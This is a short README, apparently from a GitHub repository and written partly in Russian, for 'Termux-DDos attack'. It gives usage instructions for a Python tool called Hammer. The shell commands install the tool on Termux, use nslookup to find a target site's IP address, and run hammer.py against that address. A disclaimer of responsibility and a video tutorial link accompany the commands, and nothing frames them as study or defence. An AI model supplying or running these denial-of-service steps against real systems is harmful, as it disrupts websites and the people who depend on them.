# Termux-DDos attack

[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)<br/><br/>

### Внимание
Автор данной стати не несет ответственности за любие последствия! 


## Usage:
```
$ apt update
$ apt upgrade
$ apt install python
$ apt install git
$ apt install dnsutils
$ git clone https://github.com/CruzTed/Hammer/

Hammer need the Name Server of a website which you want to attack...
To get the Name Server...just type
$ nslookup example.com
Note the IP Address of that Website

then
$ cd Hammer
$ python3 hammer.py -s [ip Address] -t 135
example:
$ python3 hammer.py -s 123.45.67.89 -t 135
```

## Video Tutorial:
Если ви что либо не понимаете то зайдите и посмотрите видео урок по установлених DDos-Attack

How to use Hammer [`Watch it`](http://www.youtube.com/watch?v=HVbRUhX2EPo)

